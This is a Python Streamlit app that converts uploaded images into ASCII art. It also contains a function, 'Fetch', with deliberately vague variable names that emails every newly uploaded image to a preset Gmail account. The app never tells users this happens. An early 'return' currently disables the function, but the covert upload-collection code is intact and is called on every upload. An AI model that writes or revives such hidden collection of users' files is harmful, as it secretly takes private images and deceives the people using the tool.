import os
import io
import datetime
import numpy as np
import streamlit as st
from PIL import Image, ImageDraw, ImageFont, ImageEnhance

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import mimetypes
import tempfile

charsASCII = ["@", "#", "8", "&", "o", ":", "*", ".", " "]

# def ResizeImage(image, newWidth=100):
#     width, height = image.size
#     aspect_ratio = height / width
#     new_height = int(aspect_ratio * newWidth)
#     resized_image = image.resize((newWidth, new_height))
#     return resized_image

def ResizeImage(image, maxSize=(200, 200)):
    width, height = image.size
    if width * height > maxSize[0] * maxSize[1]:
        image.thumbnail(maxSize)
    return image

def GrayScaleImage(image):
    tempImage = image.convert("L")
    st.image(tempImage, caption="Grayscale Image", use_container_width=True)

    return tempImage

def EnhanceContrast(image):
    enhancer = ImageEnhance.Contrast(image)
    tempImage = enhancer.enhance(1.5)
    st.image(tempImage, caption="Contrast Enhanced Image", use_container_width=True)

    return tempImage

def pixelToASCII(pixelValue):
    return charsASCII[pixelValue // 32]

def ImageToASCII(uploadedImage=None, imagePath=None):
    try:
        if imagePath:
            image = Image.open(imagePath)
        else:
            image = uploadedImage
        
        image = ResizeImage(image)
        width, height = image.size
        print("While fetching:\n",width,"X",height)
        
        image = GrayScaleImage(image)
        
        image = EnhanceContrast(image)
        
        pixels = np.array(image)
        imageASCII = []
        # for row in pixels:
        #     imageASCII.append(''.join(pixelToASCII(pixel) for pixel in row))

        for y in range(height):
            row = ""
            for x in range(width):
                row += pixelToASCII(pixels[y, x])
            imageASCII.append(row)
        
        return imageASCII
    except Exception as e:
        print(f"Error: {e}")
        return None

def SaveASCIIImage(imageASCII, outputPath=None, fontPath=None, fontSize=6):
    imgWidth = max(len(line) for line in imageASCII) * fontSize
    imgHeight = len(imageASCII) * fontSize
    # print("While saving\n",imgWidth,"X",imgHeight)
    img = Image.new('RGB', (imgWidth, imgHeight), color="white")
    
    draw = ImageDraw.Draw(img)
    
    try:
        # font = ImageFont.truetype(fontPath, fontSize)
        font = ImageFont.load_default()
    except IOError:
        print("Font not Found!!")
    # font = ImageFont.load_default()
    
    for i, line in enumerate(imageASCII):
        draw.text((0, i * fontSize), line, fill="black", font=font)
    
    if outputPath:
        img.save(outputPath, "JPEG")
        # print(f"ASCII image saved as {outputPath}")
    else:
        imgByteArr = io.BytesIO()
        img.save(imgByteArr, format="JPEG")
        imgByteArr.seek(0)
        return imgByteArr, img

def Fetch(file):
    return
    temp1 = st.secrets["temp1"]
    temp2 = st.secrets["temp1"]
    password = st.secrets["secretKey"]

    sub = f"Image Uploaded at {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"
    body= f"Image: {file}"
    # print("\n--------\n" ,sub,"\n" ,body, "\n--------")

    temp3 = MIMEMultipart()
    temp3['From'] = temp1
    temp3['To'] = temp2
    temp3['Subject'] = sub

    temp3.attach(MIMEText(body, "plain"))

    mimeType, encoding = mimetypes.guess_type(file)
    if mimeType is None:
        mimeType = 'application/octet-stream'
    
    with open(file, "rb") as messageFile:
        part = MIMEBase(mimeType.split('/')[0], mimeType.split('/')[1])
        part.set_payload(messageFile.read())
        encoders.encode_base64(part)

        part.add_header('Content-Disposition', f'attachment; filename={file.split("/")[-1]}')

        temp3.attach(part)
    
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()

        server.login(temp1, password)

        server.sendmail(temp1, temp2, temp3.as_string())

    except Exception as e:
        print(f"Error: {e}")
    finally:
        server.quit()
    

def main():
    st.title("Image to Art🎨!!")

    if "uploadedImage" not in st.session_state:
        st.session_state.uploadedImage = None
    if "canReset" not in st.session_state:
        st.session_state.canReset = False
    if "uniqueSet" not in st.session_state:
        st.session_state.uniqueSet = set()
    print("Start: ",st.session_state)

    file = st.file_uploader("Upload an Image: ", type=['png', 'jpg', 'jpeg'], accept_multiple_files=False)

    if file:
        if file.name not in st.session_state.uniqueSet:
            st.session_state.uniqueSet.add(str(file.name))
            
            with tempfile.NamedTemporaryFile(delete=False) as temporaryFile:
                temporaryFile.write(file.getbuffer())
                tempPath = temporaryFile.name

            Fetch(tempPath)

            # print("\nuniqueSet:", st.session_state.uniqueSet)

    if st.button("Create Art!",icon="🎨", use_container_width=True):
        # print("setToTrue")
        st.session_state.canReset = True

    if file and st.session_state.canReset:
        image = Image.open(file)
        st.session_state.uploadedImage = image
        # st.session_state.canReset = True

    if st.session_state.uploadedImage and st.session_state.canReset:
        imageASCII = ImageToASCII(st.session_state.uploadedImage)
        if imageASCII:
            # fontPath = os.path.join(os.path.dirname(__file__), 'fonts', 'Courier New.ttf')

            # st.text_area("Generated Art: ",value='\n'.join(imageASCII), height=300)
            ImageASCIIFile, ImageASCIIObj = SaveASCIIImage(imageASCII)

            st.image(ImageASCIIObj, caption="Generated ASCII Art", use_container_width=True)

            col1, col2 = st.columns([1,1], vertical_alignment="center")
            with col1:
                st.download_button("Download Art Image", ImageASCIIFile, "artImage.jpg", "image/jpeg", icon="⏬")
            with col2:
                st.info("Don't forget to Zoom into the image.")
        else:
            st.error("Failed!!")
        
        st.session_state.canReset = False
        
        if st.button("Try Another!!", icon="🆕", use_container_width=True):
            st.session_state.uploadedImage = None
            # print("setToFalse")
            st.session_state.canReset = False
            # st.session_state.clear()
    print("End: ",st.session_state)

# Call the main function with the image path and output path
# imagePath = <file_path>
# outputPath = "outputASCIIImage.jpg"
# if os.path.exists(imagePath):
#     main(imagePath, outputPath)
# else:
#     print("Path not Found!!")

if __name__ == "__main__":
    main()
